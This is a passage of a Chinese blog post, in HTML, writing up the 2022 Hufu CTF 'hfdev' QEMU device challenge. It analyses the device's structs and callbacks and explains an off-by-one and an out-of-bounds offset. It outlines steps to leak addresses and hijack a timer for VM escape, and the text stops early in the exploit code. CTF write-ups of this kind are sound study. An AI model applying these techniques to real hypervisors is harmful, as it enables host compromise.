@@ -1,0 +1,1058 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="baidu-site-verification" content="NkA6ndXFZC">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"www.xi4oyu.top","root":"/","images":"/images","scheme":"Gemini","version":"8.7.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<meta name="description" content="off-by-one 藏得挺深啊">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2022-虎符CTF-hfdev">
+<meta property="og:url" content="http://www.xi4oyu.top/cdcd3a27/index.html">
+<meta property="og:site_name" content="feather&#39;s blog">
+<meta property="og:description" content="off-by-one 藏得挺深啊">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.xi4oyu.top/images/cdcd3a27/pasted-1.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/cdcd3a27/pasted-2.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/cdcd3a27/pasted-3.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/cdcd3a27/pasted-16.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/cdcd3a27/pasted-4.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/cdcd3a27/pasted-6.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/cdcd3a27/pasted-8.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/cdcd3a27/pasted-9.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/cdcd3a27/pasted-15.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/cdcd3a27/pasted-11.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/cdcd3a27/pasted-12.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/cdcd3a27/pasted-13.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/cdcd3a27/pasted-14.png">
+<meta property="article:published_time" content="2022-03-26T09:42:00.000Z">
+<meta property="article:modified_time" content="2022-03-26T09:42:00.000Z">
+<meta property="article:author" content="feather">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="qemu">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.xi4oyu.top/images/cdcd3a27/pasted-1.png">
+
+
+<link rel="canonical" href="http://www.xi4oyu.top/cdcd3a27/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://www.xi4oyu.top/cdcd3a27/","path":"cdcd3a27/","title":"2022-虎符CTF-hfdev"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>2022-虎符CTF-hfdev | feather's blog</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="feather's blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">feather's blog</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HfdevState"><span class="nav-number">1.1.</span> <span class="nav-text">HfdevState</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hfdev-class-init"><span class="nav-number">1.2.</span> <span class="nav-text">hfdev_class_init</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pci-hfdev-realize"><span class="nav-number">1.3.</span> <span class="nav-text">pci_hfdev_realize</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hfdev-func"><span class="nav-number">1.4.</span> <span class="nav-text">hfdev_func</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hfdev-process"><span class="nav-number">1.5.</span> <span class="nav-text">hfdev_process</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Reader"><span class="nav-number">1.5.1.</span> <span class="nav-text">Reader</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Timer"><span class="nav-number">1.5.2.</span> <span class="nav-text">Timer</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Encoder"><span class="nav-number">1.5.3.</span> <span class="nav-text">Encoder</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hfdev-port-write"><span class="nav-number">1.6.</span> <span class="nav-text">hfdev_port_write</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hfdev-port-read"><span class="nav-number">1.7.</span> <span class="nav-text">hfdev_port_read</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">利用分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#off-by-one-%E4%BF%AE%E6%94%B9-checker"><span class="nav-number">2.1.</span> <span class="nav-text">off-by-one 修改 checker</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Leak-Heap-Address"><span class="nav-number">2.2.</span> <span class="nav-text">Leak Heap Address</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Leak-Code-Base"><span class="nav-number">2.3.</span> <span class="nav-text">Leak Code Base</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Hijack-Timer"><span class="nav-number">2.4.</span> <span class="nav-text">Hijack Timer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exp"><span class="nav-number">2.5.</span> <span class="nav-text">Exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E"><span class="nav-number">3.</span> <span class="nav-text">写在最后</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">3.1.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-overview">
+            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="feather" src="/images/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">feather</p>
+  <div class="site-description" itemprop="description">计算机技术&个人琐碎事</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">62</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">40</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/featherl" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;featherl" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:featherm@126.com" title="E-Mail → mailto:featherm@126.com" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://0x4qe.github.io/" title="https:&#x2F;&#x2F;0x4qe.github.io&#x2F;" rel="noopener" target="_blank">0x4qE</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://wzyxv1n.top/" title="https:&#x2F;&#x2F;wzyxv1n.top&#x2F;" rel="noopener" target="_blank">转爷</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://github.red/" title="https:&#x2F;&#x2F;github.red&#x2F;" rel="noopener" target="_blank">茄皇</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://fl0.top/" title="http:&#x2F;&#x2F;fl0.top&#x2F;" rel="noopener" target="_blank">qz</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://legr4ndk.github.io/" title="https:&#x2F;&#x2F;legr4ndk.github.io&#x2F;" rel="noopener" target="_blank">Legrandk</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://hikawa.ml/" title="https:&#x2F;&#x2F;hikawa.ml&#x2F;" rel="noopener" target="_blank">Akira</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://x9un.github.io/" title="https:&#x2F;&#x2F;x9un.github.io&#x2F;" rel="noopener" target="_blank">_357</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://altonhe.github.io/" title="https:&#x2F;&#x2F;altonhe.github.io&#x2F;" rel="noopener" target="_blank">Trotsky</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.thesoldierjack.cn/" title="https:&#x2F;&#x2F;www.thesoldierjack.cn&#x2F;" rel="noopener" target="_blank">digger</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://wr-web.github.io/" title="https:&#x2F;&#x2F;wr-web.github.io&#x2F;" rel="noopener" target="_blank">wr</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://annevi.cn/" title="https:&#x2F;&#x2F;annevi.cn&#x2F;" rel="noopener" target="_blank">annevi</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.zhouweitong.site/" title="http:&#x2F;&#x2F;www.zhouweitong.site&#x2F;" rel="noopener" target="_blank">obj</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.wz22.cc/" title="https:&#x2F;&#x2F;blog.wz22.cc&#x2F;" rel="noopener" target="_blank">Moesang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://me.liki.link/" title="https:&#x2F;&#x2F;me.liki.link&#x2F;" rel="noopener" target="_blank">kg</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://cosmos.red/" title="https:&#x2F;&#x2F;cosmos.red&#x2F;" rel="noopener" target="_blank">boss-c</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://jacksonyu1334.github.io/" title="https:&#x2F;&#x2F;jacksonyu1334.github.io" rel="noopener" target="_blank">jackson</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://cjovi.icu/" title="https:&#x2F;&#x2F;cjovi.icu&#x2F;" rel="noopener" target="_blank">cj</a>
+        </li>
+    </ul>
+  </div>
+
+          </div>
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.xi4oyu.top/cdcd3a27/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpeg">
+      <meta itemprop="name" content="feather">
+      <meta itemprop="description" content="计算机技术&个人琐碎事">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="feather's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2022-虎符CTF-hfdev
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-03-26 17:42:00" itemprop="dateCreated datePublished" datetime="2022-03-26T17:42:00+08:00">2022-03-26</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>11k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>10 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p><img src="/images/cdcd3a27/pasted-1.png" alt="pwn!"><br>off-by-one 藏得挺深啊</p>
+<span id="more"></span>
+
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>start_qemu.sh 文件如下</p>
+<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;sh
+#gdb -args \
+.&#x2F;qemu-system-x86_64 \
+-m 256M \
+-kernel bzImage \
+-hda rootfs.img \
+-append &quot;console&#x3D;ttyS0 quiet root&#x3D;&#x2F;dev&#x2F;sda rw init&#x3D;&#x2F;init oops&#x3D;panic panic&#x3D;1 panic_on_warn&#x3D;1 kaslr&quot; \
+-monitor &#x2F;dev&#x2F;null \
+-smp cores&#x3D;1,threads&#x3D;1 \
+-cpu kvm64,+smep,+smap \
+-L pc-bios \
+-device hfdev \
+-no-reboot \
+-snapshot  \
+-nographic
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看到添加了一个叫 <code>hfdev</code> 的设备，将 qemu-system-x86_64 拖入 IDA，函数窗口搜索字符串 <code>hfdev</code> 找到对应函数进行分析</p>
+<p><img src="/images/cdcd3a27/pasted-2.png" alt="functions"></p>
+<h3 id="HfdevState"><a href="#HfdevState" class="headerlink" title="HfdevState"></a>HfdevState</h3><p>通过逆向分析可以知道，State 大概是这样一个结构体</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">aligned</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token class-name">HfdevState</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">char</span> pub<span class="token punctuation">[</span><span class="token number">2400</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token keyword">struct</span> <span class="token class-name">MemoryRegion</span> pmio<span class="token punctuation">;</span> <span class="token comment">// size = 0x100</span>
+  <span class="token class-name">uint64_t</span> phy_src<span class="token punctuation">;</span>
+  <span class="token class-name">uint64_t</span> r_size<span class="token punctuation">;</span>
+  <span class="token class-name">uint64_t</span> pos<span class="token punctuation">;</span>
+  <span class="token class-name">uint64_t</span> cur_size<span class="token punctuation">;</span>
+  <span class="token class-name">int64_t</span> time<span class="token punctuation">;</span>
+  <span class="token keyword">struct</span> <span class="token class-name">Req</span> req<span class="token punctuation">;</span>  <span class="token comment">// size = 0x400</span>
+  <span class="token keyword">char</span> write_buf<span class="token punctuation">[</span><span class="token number">768</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token class-name">uint64_t</span> can_run_hfdev_func<span class="token punctuation">;</span>
+  <span class="token class-name">uint64_t</span> req_addr<span class="token punctuation">;</span>
+  <span class="token keyword">struct</span> <span class="token class-name">QEMUTimer</span> <span class="token operator">*</span>timer<span class="token punctuation">;</span>
+  <span class="token keyword">struct</span> <span class="token class-name">QEMUBH</span> <span class="token operator">*</span>qemubh<span class="token punctuation">;</span>
+  <span class="token keyword">char</span> padding<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="hfdev-class-init"><a href="#hfdev-class-init" class="headerlink" title="hfdev_class_init"></a>hfdev_class_init</h3><p>可以看到 vendor_id 和 device_id<br><img src="/images/cdcd3a27/pasted-3.png" alt="hfdev_class_init"></p>
+<p>利用 lspci，找到对应的设备 resource 信息，可以找到 PMIO 的端口基址<br><img src="/images/cdcd3a27/pasted-16.png" alt="lspci"></p>
+<h3 id="pci-hfdev-realize"><a href="#pci-hfdev-realize" class="headerlink" title="pci_hfdev_realize"></a>pci_hfdev_realize</h3><p>只提供 PMIO<br><img src="/images/cdcd3a27/pasted-4.png" alt="pci_hfdev_realize"></p>
+<p>同时还可以看到，创建了一个 timer 和 一个 QEMUBH</p>
+<p>这两个东西了解不多，翻源码看了看，大致就是都可以用来做异步回调的事情</p>
+<p>可以看到 timer 的回调函数是 hfdev_func，QEMUBH 的回调函数是 hfdev_process</p>
+<h3 id="hfdev-func"><a href="#hfdev-func" class="headerlink" title="hfdev_func"></a>hfdev_func</h3><p>可以看到，timer 的操作是把 req_addr 指向的数据拷贝到 write_buf 中，同时这个偏移 pos 是可以无限增长的，如果可以多次触发 timer，就能让这个越界越到后面的数据，包括 timer 和 bh 的指针<br><img src="/images/cdcd3a27/pasted-6.png" alt="hfdev_func"></p>
+<h3 id="hfdev-process"><a href="#hfdev-process" class="headerlink" title="hfdev_process"></a>hfdev_process</h3><p>开头先从指定的物理地址读取一个结构体<br><img src="/images/cdcd3a27/pasted-8.png" alt="Req"></p>
+<p>大概长这样：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>packed<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token class-name">Req</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token class-name">uint8_t</span> cmd<span class="token punctuation">;</span>
+  <span class="token keyword">union</span> Body body<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+<span class="token keyword">union</span> Body
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">struct</span> <span class="token class-name">Reader</span> reader<span class="token punctuation">;</span>
+  <span class="token keyword">struct</span> <span class="token class-name">Encoder</span> encoder<span class="token punctuation">;</span>
+  <span class="token keyword">struct</span> <span class="token class-name">Timer</span> timer<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+
+<span class="token keyword">struct</span> <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>packed<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token class-name">Reader</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token class-name">uint64_t</span> phy_addr<span class="token punctuation">;</span>
+  <span class="token class-name">uint16_t</span> size<span class="token punctuation">;</span>
+  <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token number">1013</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+<span class="token keyword">struct</span> <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>packed<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token class-name">Encoder</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token class-name">uint8_t</span> addKey<span class="token punctuation">;</span>
+  <span class="token class-name">uint8_t</span> xorKey<span class="token punctuation">;</span>
+  <span class="token class-name">uint16_t</span> subcmd<span class="token punctuation">;</span>
+  <span class="token class-name">uint16_t</span> enc_num<span class="token punctuation">;</span>
+  <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token number">1017</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+<span class="token keyword">struct</span> <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>packed<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token class-name">Timer</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token class-name">uint16_t</span> size<span class="token punctuation">;</span>
+  <span class="token class-name">uint16_t</span> off<span class="token punctuation">;</span>
+  <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token number">1019</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>大致对应三种操作</p>
+<h4 id="Reader"><a href="#Reader" class="headerlink" title="Reader"></a>Reader</h4><p>拷贝 write_buf 中的数据到指定的物理地址<br><img src="/images/cdcd3a27/pasted-9.png" alt="op reader"></p>
+<h4 id="Timer"><a href="#Timer" class="headerlink" title="Timer"></a>Timer</h4><p>可以看到这里使用了 timer_mod，翻看源码可以了解到这是设置定时器，触发即可回调 hfdev_func，同时这里有个变量决定了是否可以调用 timer_mod，而且 hfdev_func 里面也修改这个变量使其只能调用一次<br><img src="/images/cdcd3a27/pasted-15.png" alt="op timer"></p>
+<h4 id="Encoder"><a href="#Encoder" class="headerlink" title="Encoder"></a>Encoder</h4><p>这里有两种操作，首先 0x2202 对应的是把 data 进行一定的编码后存进 write_buf 里<br><img src="/images/cdcd3a27/pasted-11.png" alt="op encoder 1"></p>
+<p>0x2022 则是对 write_buf 和 data 异或编码<br><img src="/images/cdcd3a27/pasted-12.png" alt="op encoder 2"></p>
+<p>同时可以看到这里比较用的是 <code>&gt;=</code>，存在off-by-one（可恶，比赛的时候就没看出来）</p>
+<h3 id="hfdev-port-write"><a href="#hfdev-port-write" class="headerlink" title="hfdev_port_write"></a>hfdev_port_write</h3><p>写端口这里就是设置各种参数，还有就是触发 bh 的事件回调的操作<br><img src="/images/cdcd3a27/pasted-13.png" alt="hfdev_port_write"></p>
+<h3 id="hfdev-port-read"><a href="#hfdev-port-read" class="headerlink" title="hfdev_port_read"></a>hfdev_port_read</h3><p>读取各种参数，没啥好说的<br><img src="/images/cdcd3a27/pasted-14.png" alt="hfdev_port_read"></p>
+<h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>现有的信息：</p>
+<ol>
+<li>timer 的 pos 不断增长的过程中可以越界</li>
+<li>pos 越界后，利用 reader 可以读到 write_buf 后面的信息，比如 timer 对象指针和 bh 对象指针</li>
+<li>pos 的越界，也让 encoder 可以修改 timer 指针和 bh 指针，可以伪造这两个对象劫持程序执行流</li>
+<li>encoder 的 0x2022 功能存在 off-by-one</li>
+</ol>
+<h3 id="off-by-one-修改-checker"><a href="#off-by-one-修改-checker" class="headerlink" title="off-by-one 修改 checker"></a>off-by-one 修改 checker</h3><p>首先得控制 checker （即 can_run_hfdev_func）变量，以进行多次触发 timer，具体步骤如下：</p>
+<ol>
+<li>使用 encoder 0x2202 功能，让 pos = 0x200</li>
+<li>触发 timer，pos += 0x100</li>
+<li>encoder 0x2022 功能，off-by-one，修改 <code>write_buf[0x300]</code>，这刚好是 checker 变量的位置</li>
+</ol>
+<p>代码如下：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">set_phy_addr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">set_request_size</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// leak heap</span>
+<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1. leaking heap"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// getchar();</span>
+<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] pos = 0x200"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>cmd <span class="token operator">=</span> ENC<span class="token punctuation">;</span>
+req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>sub_cmd <span class="token operator">=</span> ENC1<span class="token punctuation">;</span>
